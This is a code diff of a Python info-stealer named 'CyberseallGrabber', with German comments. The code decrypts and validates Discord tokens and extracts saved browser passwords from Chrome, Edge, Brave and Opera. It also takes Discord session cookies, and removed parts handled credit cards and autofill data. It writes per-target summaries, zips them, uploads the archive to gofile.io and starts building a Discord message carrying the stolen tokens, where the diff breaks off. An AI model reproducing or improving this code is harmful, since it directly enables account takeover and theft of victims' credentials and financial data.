@@ -96,46 +96,44 @@ class CyberseallGrabber:
                                     tokens.append(values)
                     except PermissionError: 
                         continue
-                        
-                for i in tokens:
-                    if i.endswith("\\"):
-                        i.replace("\\", "")
-                    elif i not in cleaned:
-                        cleaned.append(i)
-                        
-                for token in cleaned:
+            
+            for i in tokens:
+                if i.endswith("\\"):
+                    i.replace("\\", "")
+                elif i not in cleaned:
+                    cleaned.append(i)
+            
+            for token in cleaned:
+                try:
+                    tok = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
+                    if tok != "Error":
+                        checker.append(tok)
+                except:
+                    continue
+            
+            for value in checker:
+                if value not in already_check and len(value) > 50:
+                    already_check.append(value)
+                    headers = {'Authorization': value, 'Content-Type': 'application/json'}
                     try:
-                        tok = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
-                        if tok != "Error":
-                            checker.append(tok)
+                        res = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
+                        if res.status_code == 200:
+                            self.t.append(value)
                     except:
-                        continue
-                        
-                for value in checker:
-                    if value not in already_check and len(value) > 50:
-                        already_check.append(value)
-                        # Validiere Token direkt hier
-                        headers = {'Authorization': value, 'Content-Type': 'application/json'}
-                        try:
-                            res = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
-                            if res.status_code == 200:
-                                self.t.append(value)
-                        except:
-                            pass
+                        pass
             
         except:
             pass
 
     def validate_tokens(self):
         valid_tokens = []
-        for token in self.t[:10]:  # Validiere bis zu 10 Token
+        for token in self.t[:10]:
             try:
                 headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                 r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                 if r.status_code == 200:
                     user_data = r.json()
                     
-                    # Nitro-Info abrufen
                     has_nitro = False
                     days_left = 0
                     try:
@@ -171,87 +169,12 @@ class CyberseallGrabber:
 
     def pw(self):
         try:
-            # MASSIVE BROWSER-PFADE BASIEREND AUF TESTDATEN
-            BROWSER_PATHS = {}
-            
-            # Alle Chromium-basierten Browser aus testdaten/paths.js
-            chromium_browsers = {
-                'Google(x86)': 'AppData\\Local\\Google(x86)\\Chrome\\User Data',
-                'Google SxS': 'AppData\\Local\\Google\\Chrome SxS\\User Data',
-                'Chromium': 'AppData\\Local\\Chromium\\User Data',
-                'Thorium': 'AppData\\Local\\Thorium\\User Data',
-                'Chrome': 'AppData\\Local\\Google\\Chrome\\User Data',
-                'MapleStudio': 'AppData\\Local\\MapleStudio\\ChromePlus\\User Data',
-                'Iridium': 'AppData\\Local\\Iridium\\User Data',
-                '7Star': 'AppData\\Local\\7Star\\7Star\\User Data',
-                'CentBrowser': 'AppData\\Local\\CentBrowser\\User Data',
-                'Chedot': 'AppData\\Local\\Chedot\\User Data',
-                'Vivaldi': 'AppData\\Local\\Vivaldi\\User Data',
-                'Kometa': 'AppData\\Local\\Kometa\\User Data',
-                'Elements': 'AppData\\Local\\Elements Browser\\User Data',
-                'Epic': 'AppData\\Local\\Epic Privacy Browser\\User Data',
-                'uCozMedia': 'AppData\\Local\\uCozMedia\\Uran\\User Data',
-                'Fenrir': 'AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer',
-                'Catalina': 'AppData\\Local\\CatalinaGroup\\Citrio\\User Data',
-                'Coowon': 'AppData\\Local\\Coowon\\Coowon\\User Data',
-                'Liebao': 'AppData\\Local\\liebao\\User Data',
-                'QIP Surf': 'AppData\\Local\\QIP Surf\\User Data',
-                'Orbitum': 'AppData\\Local\\Orbitum\\User Data',
-                'Comodo': 'AppData\\Local\\Comodo\\Dragon\\User Data',
-                '360Browser': 'AppData\\Local\\360Browser\\Browser\\User Data',
-                'Maxthon3': 'AppData\\Local\\Maxthon3\\User Data',
-                'K-Melon': 'AppData\\Local\\K-Melon\\User Data',
-                'CocCoc': 'AppData\\Local\\CocCoc\\Browser\\User Data',
-                'Amigo': 'AppData\\Local\\Amigo\\User Data',
-                'Torch': 'AppData\\Local\\Torch\\User Data',
-                'Sputnik': 'AppData\\Local\\Sputnik\\Sputnik\\User Data',
-                'Edge': 'AppData\\Local\\Microsoft\\Edge\\User Data',
-                'DCBrowser': 'AppData\\Local\\DCBrowser\\User Data',
-                'Yandex': 'AppData\\Local\\Yandex\\YandexBrowser\\User Data',
-                'UR Browser': 'AppData\\Local\\UR Browser\\User Data',
-                'Slimjet': 'AppData\\Local\\Slimjet\\User Data',
-                'BraveSoftware': 'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data',
-                'Opera': 'AppData\\Roaming\\Opera Software\\Opera Stable',
-                'Opera GX': 'AppData\\Roaming\\Opera Software\\Opera GX Stable',
-            }
-            
-            # Konvertiere Windows-Pfade zu Python-Pfaden und scanne alle Profile
-            for browser_name, rel_path in chromium_browsers.items():
-                # Konvertiere AppData-Pfad
-                if rel_path.startswith('AppData\\Local\\'):
-                    base_path = os.path.join(os.getenv("LOCALAPPDATA"), rel_path[15:].replace('\\', os.sep))
-                elif rel_path.startswith('AppData\\Roaming\\'):
-                    base_path = os.path.join(os.getenv("APPDATA"), rel_path[17:].replace('\\', os.sep))
-                else:
-                    continue
-                
-                if not os.path.exists(base_path):
-                    continue
-                
-                # Scanne alle Profile in diesem Browser
-                try:
-                    for item in os.listdir(base_path):
-                        item_path = os.path.join(base_path, item)
-                        if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
-                            # Bestimme Login-Datei basierend auf Browser
-                            if 'Yandex' in browser_name:
-                                login_file = "\\Ya Passman Data"
-                            else:
-                                login_file = "\\Login Data"
-                            
-                            BROWSER_PATHS[f"{browser_name} ({item})"] = {
-                                "profile_path": item_path,
-                                "login_db": login_file
-                            }
-                except:
-                    pass
-            
             def decrypt_password(password, key):
                 try:
                     if not password or len(password) < 3:
                         return "Failed to decrypt"
 
-                    # Methode 1: AES-GCM Entschlüsselung (Chrome 80+)
+                    # AES-GCM Entschlüsselung (Chrome 80+)
                     try:
                         if password[:3] == b'v10' or password[:3] == b'v11':
                             iv = password[3:15]
@@ -260,10 +183,10 @@ class CyberseallGrabber:
                             decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                             if decrypted_pass and len(decrypted_pass) > 0:
                                 return decrypted_pass
-                    except Exception as e:
+                    except:
                         pass
 
-                    # Methode 2: Direkte AES-GCM ohne Version-Check
+                    # Direkte AES-GCM ohne Version-Check
                     try:
                         if len(password) >= 15:
                             iv = password[3:15]
@@ -272,20 +195,20 @@ class CyberseallGrabber:
                             decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                             if decrypted_pass and len(decrypted_pass) > 0:
                                 return decrypted_pass
-                    except Exception as e:
+                    except:
                         pass
 
-                    # Methode 3: DPAPI Entschlüsselung (Chrome <80)
+                    # DPAPI Entschlüsselung (Chrome <80)
                     try:
                         result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                         if result and result[1]:
                             decrypted = result[1].decode('utf-8') if isinstance(result[1], bytes) else str(result[1])
                             if decrypted and len(decrypted) > 0:
                                 return decrypted
-                    except Exception as e:
+                    except:
                         pass
 
-                    # Methode 4: Alternative AES-GCM mit verschiedenen IV-Längen
+                    # Alternative AES-GCM mit verschiedenen IV-Längen
                     try:
                         for iv_start in [3, 0, 12]:
                             for iv_len in [12, 16, 8]:
@@ -296,10 +219,10 @@ class CyberseallGrabber:
                                     decrypted_pass = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                                     if decrypted_pass and len(decrypted_pass) > 0:
                                         return decrypted_pass
-                    except Exception as e:
+                    except:
                         pass
 
-                    # Methode 5: Rohe Bytes-Analyse für teilweise Wiederherstellung
+                    # Rohe Bytes-Analyse für teilweise Wiederherstellung
                     try:
                         if isinstance(password, bytes) and len(password) > 10:
                             printable_chars = ''.join(chr(c) for c in password if 32 <= c <= 126)
@@ -309,269 +232,246 @@ class CyberseallGrabber:
                         pass
 
                     return "Failed to decrypt"
-                except Exception as e:
-                    return f"Error: {str(e)[:30]}"
+                except:
+                    return "Failed to decrypt"
             
             def get_browser_passwords():
                 passwords = []
-                browser_data = BROWSER_PATHS
+                
+                # Erweiterte Browser-Pfade mit mehreren Varianten
+                simple_browsers = []
+                
+                # Chrome - alle möglichen Pfade
+                chrome_paths = [
+                    os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+                    os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data"),
+                    os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data")
+                ]
+                
+                for chrome_base in chrome_paths:
+                    if os.path.exists(chrome_base):
+                        for profile in ["Default", "Profile 1", "Profile 2"]:
+                            profile_path = os.path.join(chrome_base, profile)
+                            if os.path.exists(profile_path):
+                                simple_browsers.append({
+                                    "name": f"Chrome-{profile}",
+                                    "path": profile_path,
+                                    "base_path": chrome_base,
+                                    "login_file": "Login Data"
+                                })
+                
+                # Edge - alle möglichen Pfade
+                edge_paths = [
+                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
+                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta", "User Data"),
+                    os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev", "User Data")
+                ]
+                
+                for edge_base in edge_paths:
+                    if os.path.exists(edge_base):
+                        for profile in ["Default", "Profile 1"]:
+                            profile_path = os.path.join(edge_base, profile)
+                            if os.path.exists(profile_path):
+                                simple_browsers.append({
+                                    "name": f"Edge-{profile}",
+                                    "path": profile_path,
+                                    "base_path": edge_base,
+                                    "login_file": "Login Data"
+                                })
+                
+                # Brave
+                brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
+                if os.path.exists(brave_base):
+                    for profile in ["Default", "Profile 1"]:
+                        profile_path = os.path.join(brave_base, profile)
+                        if os.path.exists(profile_path):
+                            simple_browsers.append({
+                                "name": f"Brave-{profile}",
+                                "path": profile_path,
+                                "base_path": brave_base,
+                                "login_file": "Login Data"
+                            })
+                
+                # Opera
+                opera_base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")
+                if os.path.exists(opera_base):
+                    simple_browsers.append({
+                        "name": "Opera",
+                        "path": opera_base,
+                        "base_path": opera_base,
+                        "login_file": "Login Data"
+                    })
 
-                for browser, data in browser_data.items():
+                for browser_info in simple_browsers:
                     try:
-                        profile_path = data["profile_path"]
-                        login_db = data["login_db"]
+                        browser_name = browser_info["name"]
+                        profile_path = browser_info["path"]
+                        base_path = browser_info.get("base_path", profile_path)
+                        login_file = browser_info["login_file"]
 
                         if not os.path.exists(profile_path):
                             continue
 
-                        if "signons.sqlite" in login_db:
+                        login_db_path = os.path.join(profile_path, login_file)
+                        if not os.path.exists(login_db_path):
                             continue
 
-                        full_login_db_path = os.path.join(profile_path + login_db)
-                        if not os.path.exists(full_login_db_path):
-                            continue
-
-                        state_file = os.path.join(profile_path, "Local State")
+                        # Suche Local State im base_path (User Data Ordner)
+                        state_file = os.path.join(base_path, "Local State")
                         if not os.path.exists(state_file):
+                            # Fallback: Suche im profile_path
+                            state_file = os.path.join(profile_path, "Local State")
+                            if not os.path.exists(state_file):
+                                continue
+
+                        # Hole Master Key
+                        try:
+                            with open(state_file, "r", encoding="utf-8") as f:
+                                local_state = json.loads(f.read())
+                                encrypted_key = local_state["os_crypt"]["encrypted_key"]
+                                master_key = base64.b64decode(encrypted_key)[5:]
+                                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                        except:
                             continue
 
-                        with open(state_file, "r", encoding="utf-8") as f:
-                            local_state = json.loads(f.read())
-                            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-
-                        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-
-                        temp_db = os.path.join(os.getenv("TEMP"), f"{browser.replace(' ', '_')}_login_data.db")
-                        if os.path.exists(temp_db):
-                            os.remove(temp_db)
-
-                        with open(full_login_db_path, "rb") as login_data_file:
-                            with open(temp_db, "wb") as temp_file:
-                                temp_file.write(login_data_file.read())
-
-                        conn = sqlite3.connect(temp_db)
-                        cursor = conn.cursor()
-
+                        # Kopiere Login-Datenbank
+                        temp_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_login.db")
                         try:
-                            # Erweiterte SQL-Abfrage mit mehr Feldern
-                            cursor.execute("SELECT origin_url, username_value, password_value, date_created, times_used FROM logins")
+                            if os.path.exists(temp_db):
+                                os.remove(temp_db)
+                            shutil.copy2(login_db_path, temp_db)
+                        except:
+                            continue
+
+                        # Extrahiere Passwörter
+                        try:
+                            conn = sqlite3.connect(temp_db)
+                            cursor = conn.cursor()
+                            
+                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                             login_data = cursor.fetchall()
 
-                            success_count = 0
-                            failed_count = 0
-
                             for row in login_data:
-                                url = row[0] if len(row) > 0 else ""
-                                username = row[1] if len(row) > 1 else ""
-                                password = row[2] if len(row) > 2 else ""
-                                date_created = row[3] if len(row) > 3 else 0
-                                times_used = row[4] if len(row) > 4 else 0
-                                
-                                if not url or not username or not password:
-                                    continue
-
-                                try:
-                                    decrypted_password = decrypt_password(password, master_key)
-
-                                    if url and username and decrypted_password:
-                                        if decrypted_password != "Failed to decrypt":
-                                            success_count += 1
-                                        else:
-                                            failed_count += 1
-
+                                if len(row) >= 3 and row[0] and row[1] and row[2]:
+                                    url, username, encrypted_password = row[0], row[1], row[2]
+                                    
+                                    decrypted_password = None
+                                    
+                                    # Methode 1: Mit Master Key
+                                    try:
+                                        decrypted_password = decrypt_password(encrypted_password, master_key)
+                                    except:
+                                        pass
+                                    
+                                    # Methode 2: Direkte DPAPI-Entschlüsselung (Fallback)
+                                    if not decrypted_password or decrypted_password == "Failed to decrypt":
+                                        try:
+                                            result = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)
+                                            if result and result[1]:
+                                                decrypted_password = result[1].decode('utf-8') if isinstance(result[1], bytes) else str(result[1])
+                                        except:
+                                            pass
+                                    
+                                    # Methode 3: Rohe Daten-Analyse (letzter Versuch)
+                                    if not decrypted_password or decrypted_password == "Failed to decrypt":
+                                        try:
+                                            if isinstance(encrypted_password, bytes) and len(encrypted_password) > 10:
+                                                readable = ''.join(chr(c) for c in encrypted_password if 32 <= c <= 126)
+                                                if len(readable) > 3:
+                                                    decrypted_password = f"Partial: {readable[:30]}"
+                                        except:
+                                            pass
+                                    
+                                    # Speichere Passwort wenn erfolgreich
+                                    if decrypted_password and decrypted_password != "Failed to decrypt":
                                         passwords.append({
-                                            "browser": browser,
+                                            "browser": browser_name,
                                             "url": url,
                                             "username": username,
                                             "password": decrypted_password,
-                                            "times_used": times_used,
-                                            "date_created": date_created
+                                            "times_used": 0,
+                                            "date_created": 0
                                         })
-                                except Exception as e:
-                                    failed_count += 1
-                                    passwords.append({
-                                        "browser": browser,
-                                        "url": url,
-                                        "username": username,
-                                        "password": f"Error: {str(e)[:30]}",
-                                        "times_used": times_used,
-                                        "date_created": date_created
-                                    })
+
+                            cursor.close()
+                            conn.close()
                             
-                            # Zusätzlich: Kreditkarten extrahieren
                             try:
-                                web_data_path = os.path.join(profile_path, "Web Data")
-                                if os.path.exists(web_data_path):
-                                    temp_web_db = os.path.join(os.getenv("TEMP"), f"{browser.replace(' ', '_')}_web_data.db")
-                                    if os.path.exists(temp_web_db):
-                                        os.remove(temp_web_db)
-                                    
-                                    with open(web_data_path, "rb") as web_file:
-                                        with open(temp_web_db, "wb") as temp_web_file:
-                                            temp_web_file.write(web_file.read())
-                                    
-                                    web_conn = sqlite3.connect(temp_web_db)
-                                    web_cursor = web_conn.cursor()
-                                    
-                                    # Kreditkarten
-                                    web_cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
-                                    credit_cards = web_cursor.fetchall()
-                                    
-                                    for card in credit_cards:
-                                        if card[1]:  # card_number_encrypted
-                                            try:
-                                                decrypted_card = decrypt_password(card[1], master_key)
-                                                if decrypted_card and decrypted_card != "Failed to decrypt":
-                                                    passwords.append({
-                                                        "browser": browser,
-                                                        "url": "CREDIT_CARD",
-                                                        "username": card[0] or "Unknown",
-                                                        "password": f"Card: {decrypted_card} | Exp: {card[2]}/{card[3]}",
-                                                        "times_used": 0,
-                                                        "date_created": 0
-                                                    })
-                                            except:
-                                                pass
-                                    
-                                    # Autofill-Daten
-                                    web_cursor.execute("SELECT name, value FROM autofill WHERE name LIKE '%email%' OR name LIKE '%phone%' OR name LIKE '%address%'")
-                                    autofill_data = web_cursor.fetchall()
-                                    
-                                    for autofill in autofill_data[:5]:  # Limit auf 5
-                                        if autofill[0] and autofill[1]:
-                                            passwords.append({
-                                                "browser": browser,
-                                                "url": "AUTOFILL_DATA",
-                                                "username": autofill[0],
-                                                "password": autofill[1],
-                                                "times_used": 0,
-                                                "date_created": 0
-                                            })
-                                    
-                                    web_cursor.close()
-                                    web_conn.close()
-                                    
-                                    try:
-                                        os.remove(temp_web_db)
-                                    except:
-                                        pass
+                                os.remove(temp_db)
                             except:
                                 pass
 
-                            # Debug-Info in Datei schreiben statt print
-                            try:
-                                debug_file = os.path.join(self.d, "debug.txt")
-                                with open(debug_file, "a", encoding="utf-8") as df:
-                                    if success_count > 0:
-                                        df.write(f"Successfully decrypted {success_count} passwords from {browser} ({failed_count} failed)\n")
-                                    elif failed_count > 0:
-                                        df.write(f"Failed to decrypt all {failed_count} passwords from {browser}\n")
-                            except:
-                                pass
-
-                        except Exception as e:
-                            # Debug-Info in Datei schreiben statt print
-                            try:
-                                debug_file = os.path.join(self.d, "debug.txt")
-                                with open(debug_file, "a", encoding="utf-8") as df:
-                                    df.write(f"Error executing SQL query in {browser}: {str(e)}\n")
-                            except:
-                                pass
-
-                        cursor.close()
-                        conn.close()
-
-                        try:
-                            os.remove(temp_db)
                         except:
                             pass
 
-                    except Exception as e:
-                        # Debug-Info in Datei schreiben statt print
-                        try:
-                            debug_file = os.path.join(self.d, "debug.txt")
-                            with open(debug_file, "a", encoding="utf-8") as df:
-                                df.write(f"Error processing {browser}: {str(e)}\n")
-                        except:
-                            pass
+                    except:
+                        pass
 
                 return passwords
             
-            # Hole alle Browser-Passwörter
-            password_data = get_browser_passwords()
-            
-            # Zusätzlich: Cookie-Extraktion für Session-Hijacking
+            # Vereinfachte Cookie-Extraktion
             def extract_valuable_cookies():
                 valuable_cookies = []
-                valuable_sites = [
-                    '.discord.com', '.spotify.com', '.instagram.com', '.tiktok.com', 
-                    '.facebook.com', '.twitter.com', '.github.com', '.google.com',
-                    '.amazon.com', '.paypal.com', '.netflix.com', '.youtube.com',
-                    '.twitch.tv', '.reddit.com', '.linkedin.com', '.microsoft.com'
-                ]
                 
-                for browser_name, browser_data in BROWSER_PATHS.items():
-                    try:
-                        profile_path = browser_data["profile_path"]
-                        cookies_path = os.path.join(profile_path, "Cookies")
-                        
-                        if not os.path.exists(cookies_path):
-                            continue
-                        
-                        # Hole Master Key für Cookie-Entschlüsselung
-                        state_file = os.path.join(profile_path, "Local State")
-                        if not os.path.exists(state_file):
-                            continue
-                        
-                        with open(state_file, "r", encoding="utf-8") as f:
-                            local_state = json.loads(f.read())
-                            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-                        
+                # Nur Chrome für erste Tests
+                chrome_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default")
+                cookies_path = os.path.join(chrome_path, "Cookies")
+                
+                if not os.path.exists(cookies_path):
+                    return valuable_cookies
+                
+                try:
+                    # Hole Master Key
+                    state_file = os.path.join(chrome_path, "Local State")
+                    if not os.path.exists(state_file):
+                        return valuable_cookies
+                    
+                    with open(state_file, "r", encoding="utf-8") as f:
+                        local_state = json.loads(f.read())
+                        encrypted_key = local_state["os_crypt"]["encrypted_key"]
+                        master_key = base64.b64decode(encrypted_key)[5:]
                         master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                        
-                        temp_cookies_db = os.path.join(os.getenv("TEMP"), f"{browser_name.replace(' ', '_')}_cookies.db")
-                        if os.path.exists(temp_cookies_db):
-                            os.remove(temp_cookies_db)
-                        
-                        with open(cookies_path, "rb") as cookies_file:
-                            with open(temp_cookies_db, "wb") as temp_file:
-                                temp_file.write(cookies_file.read())
-                        
-                        conn = sqlite3.connect(temp_cookies_db)
-                        cursor = conn.cursor()
-                        
-                        for site in valuable_sites:
+                    
+                    # Kopiere Cookies-Datenbank
+                    temp_cookies_db = os.path.join(os.getenv("TEMP"), "chrome_cookies.db")
+                    if os.path.exists(temp_cookies_db):
+                        os.remove(temp_cookies_db)
+                    
+                    shutil.copy2(cookies_path, temp_cookies_db)
+                    
+                    conn = sqlite3.connect(temp_cookies_db)
+                    cursor = conn.cursor()
+                    
+                    # Suche nach Discord-Cookies als Test
+                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%discord.com%' LIMIT 5")
+                    cookies = cursor.fetchall()
+                    
+                    for cookie in cookies:
+                        if cookie[2]:  # encrypted_value
                             try:
-                                cursor.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies WHERE host_key LIKE ?", (f'%{site}%',))
-                                cookies = cursor.fetchall()
-                                
-                                for cookie in cookies[:3]:  # Max 3 Cookies pro Site
-                                    if cookie[2]:  # encrypted_value
-                                        try:
-                                            decrypted_value = decrypt_password(cookie[2], master_key)
-                                            if decrypted_value and decrypted_value != "Failed to decrypt" and len(decrypted_value) > 10:
-                                                valuable_cookies.append({
-                                                    "browser": browser_name,
-                                                    "url": f"COOKIE_{site}",
-                                                    "username": cookie[1],  # cookie name
-                                                    "password": decrypted_value[:100],  # Cookie value (gekürzt)
-                                                    "times_used": 0,
-                                                    "date_created": cookie[3] or 0  # expires_utc
-                                                })
-                                        except:
-                                            pass
+                                decrypted_value = decrypt_password(cookie[2], master_key)
+                                if decrypted_value and decrypted_value != "Failed to decrypt" and len(decrypted_value) > 5:
+                                    valuable_cookies.append({
+                                        "browser": "Chrome",
+                                        "url": f"COOKIE_discord.com",
+                                        "username": cookie[1],  # cookie name
+                                        "password": decrypted_value[:50],  # Cookie value (gekürzt)
+                                        "times_used": 0,
+                                        "date_created": 0
+                                    })
                             except:
                                 pass
-                        
-                        cursor.close()
-                        conn.close()
-                        
-                        try:
-                            os.remove(temp_cookies_db)
-                        except:
-                            pass
+                    
+                    cursor.close()
+                    conn.close()
+                    
+                    try:
+                        os.remove(temp_cookies_db)
                     except:
                         pass
+                        
+                except:
+                    pass
                 
                 return valuable_cookies
             
@@ -599,8 +499,7 @@ class CyberseallGrabber:
             if pw_data:
                 try:
                     with open(os.path.join(self.d, "passwords.txt"), "w", encoding="utf-8") as f:
-                        f.write("=" * 60 + "\n")
-                        f.write("🔥 CYBERSEALL BROWSER PASSWORD STEALER 2025 🔥\n")
+                        f.write("CYBERSEALL BROWSER PASSWORD STEALER\n")
                         f.write("=" * 60 + "\n\n")
                         
                         # Gruppiere Passwörter nach Browser
@@ -612,21 +511,21 @@ class CyberseallGrabber:
                             browser_groups[browser].append(password)
                         
                         for browser, passwords in browser_groups.items():
-                            f.write(f"\n🌐 {browser.upper()} ({len(passwords)} passwords)\n")
+                            f.write(f"\n{browser.upper()} ({len(passwords)} passwords)\n")
                             f.write("-" * 50 + "\n")
                             for password in passwords:
                                 f.write(password + "\n")
                             f.write("\n")
                         
                         f.write("=" * 60 + "\n")
-                        f.write(f"📊 TOTAL PASSWORDS FOUND: {len(pw_data)}\n")
-                        f.write(f"🔍 BROWSERS SCANNED: {len(browser_groups)}\n")
+                        f.write(f"TOTAL PASSWORDS FOUND: {len(pw_data)}\n")
+                        f.write(f"BROWSERS SCANNED: {len(browser_groups)}\n")
                         f.write("=" * 60 + "\n")
                         
-                except Exception as e:
+                except:
                     pass
             
-        except Exception as e:
+        except:
             pass
 
     def fi(self):
@@ -715,13 +614,99 @@ class CyberseallGrabber:
 
     def up(self):
         try:
+            # Erstelle zusätzliche Zusammenfassungsdateien
+            try:
+                # Erstelle Browser-Zusammenfassung
+                if self.p:
+                    with open(os.path.join(self.d, "browser_summary.txt"), "w", encoding="utf-8") as f:
+                        f.write("CYBERSEALL BROWSER DATA SUMMARY\n")
+                        f.write("=" * 60 + "\n\n")
+                        
+                        # Gruppiere nach Datentyp
+                        passwords = [p for p in self.p if not p.startswith("COOKIE_") and not p.startswith("CREDIT_CARD") and not p.startswith("AUTOFILL_DATA")]
+                        cookies = [p for p in self.p if p.startswith("COOKIE_")]
+                        credit_cards = [p for p in self.p if p.startswith("CREDIT_CARD")]
+                        autofill = [p for p in self.p if p.startswith("AUTOFILL_DATA")]
+                        
+                        f.write(f"STATISTICS:\n")
+                        f.write(f"Browser Passwords: {len(passwords)}\n")
+                        f.write(f"Session Cookies: {len(cookies)}\n")
+                        f.write(f"Credit Cards: {len(credit_cards)}\n")
+                        f.write(f"Autofill Data: {len(autofill)}\n")
+                        f.write(f"Total Entries: {len(self.p)}\n\n")
+                        
+                        if passwords:
+                            f.write("BROWSER PASSWORDS:\n")
+                            f.write("-" * 40 + "\n")
+                            for pwd in passwords:
+                                f.write(pwd + "\n")
+                            f.write("\n")
+                        
+                        if cookies:
+                            f.write("SESSION COOKIES:\n")
+                            f.write("-" * 40 + "\n")
+                            for cookie in cookies:
+                                f.write(cookie + "\n")
+                            f.write("\n")
+                        
+                        if credit_cards:
+                            f.write("CREDIT CARDS:\n")
+                            f.write("-" * 40 + "\n")
+                            for card in credit_cards:
+                                f.write(card + "\n")
+                            f.write("\n")
+                        
+                        if autofill:
+                            f.write("AUTOFILL DATA:\n")
+                            f.write("-" * 40 + "\n")
+                            for auto in autofill:
+                                f.write(auto + "\n")
+                            f.write("\n")
+                
+                # Erstelle Token-Zusammenfassung
+                if self.vt:
+                    with open(os.path.join(self.d, "token_summary.txt"), "w", encoding="utf-8") as f:
+                        f.write("DISCORD TOKEN SUMMARY\n")
+                        f.write("=" * 60 + "\n\n")
+                        
+                        for i, token_info in enumerate(self.vt):
+                            f.write(f"TOKEN #{i+1}:\n")
+                            f.write(f"Username: {token_info.get('username', 'Unknown')}#{token_info.get('discriminator', '0000')}\n")
+                            f.write(f"Email: {token_info.get('email', 'Hidden')}\n")
+                            f.write(f"Phone: {token_info.get('phone', 'None')}\n")
+                            f.write(f"Nitro: {token_info.get('has_nitro', False)} ({token_info.get('nitro_days_left', 0)} days left)\n")
+                            f.write(f"MFA: {token_info.get('mfa_enabled', False)}\n")
+                            f.write(f"Verified: {token_info.get('verified', False)}\n")
+                            f.write(f"Premium: {token_info.get('premium_type', 0)}\n")
+                            f.write(f"Token: {token_info['token']}\n")
+                            f.write("-" * 50 + "\n\n")
+                
+                # Erstelle Gesamtstatistik
+                with open(os.path.join(self.d, "GRABBER_STATISTICS.txt"), "w", encoding="utf-8") as f:
+                    f.write("CYBERSEALL ULTIMATE GRABBER v5.0\n")
+                    f.write("=" * 60 + "\n\n")
+                    f.write("FINAL STATISTICS:\n")
+                    f.write(f"Browser Passwords: {len(self.p)}\n")
+                    f.write(f"Raw Tokens: {len(set(self.t))}\n")
+                    f.write(f"Valid Tokens: {len(self.vt)}\n")
+                    f.write(f"Keyword Files: {len(self.f)}\n\n")
+                    f.write(f"Target: {getpass.getuser()}@{os.getenv('COMPUTERNAME', 'Unknown')}\n")
+                    f.write(f"Platform: {platform.platform()}\n")
+                    f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                    f.write("=" * 60 + "\n")
+            except:
+                pass
+            
+            # Packe alle Dateien in ZIP
             with zipfile.ZipFile(self.zf, 'w', zipfile.ZIP_DEFLATED) as zf:
                 for root, dirs, files in os.walk(self.d):
                     for file in files:
                         if not file.endswith('.zip'):
                             fp = os.path.join(root, file)
-                            zf.write(fp, os.path.relpath(fp, self.d))
+                            arc_name = os.path.relpath(fp, self.d)
+                            zf.write(fp, arc_name)
             
+            # Upload zu GoFile
             files = {"file": open(self.zf, "rb")}
             resp = requests.post("https://store1.gofile.io/uploadFile", files=files, timeout=30)
             files["file"].close()
@@ -744,70 +729,86 @@ class CyberseallGrabber:
 
     def send(self):
         try:
+            # Zähle alle gesammelten Daten
+            total_passwords = len(self.p)
+            total_tokens = len(set(self.t))
+            valid_tokens = len(self.vt)
+            total_files = len(self.f)
+            
+            # Erstelle eine einzige umfassende Embed
+            embed_fields = [
+                {
+                    "name": "Results",
+                    "value": f"```Browser Passwords: {total_passwords}\nRaw Tokens: {total_tokens}\nValid Tokens: {valid_tokens}\nKeyword Files: {total_files}```",
+                    "inline": False
+                },
+                {
+                    "name": "Target System",
+                    "value": f"```User: {getpass.getuser()}\nComputer: {os.getenv('COMPUTERNAME', 'Unknown')}\nPlatform: {platform.platform()}```",
+                    "inline": False
+                }
+            ]
+            
+            # Füge Token-Informationen direkt in die Hauptembed ein
+            if len(self.vt) > 0:
+                for i, token_info in enumerate(self.vt[:3]):  # Max 3 Token in Hauptembed
+                    username = token_info.get('username', 'Unknown')
+                    discriminator = token_info.get('discriminator', '0000')
+                    email = token_info.get('email', 'Hidden')
+                    phone = token_info.get('phone', 'None')
+                    has_nitro = token_info.get('has_nitro', False)
+                    nitro_days = token_info.get('nitro_days_left', 0)
+                    mfa = token_info.get('mfa_enabled', False)
+                    verified = token_info.get('verified', False)
+                    premium = token_info.get('premium_type', 0)
+                    token = token_info['token']
+                    
+                    embed_fields.append({
+                        "name": f"Discord Token #{i+1}",
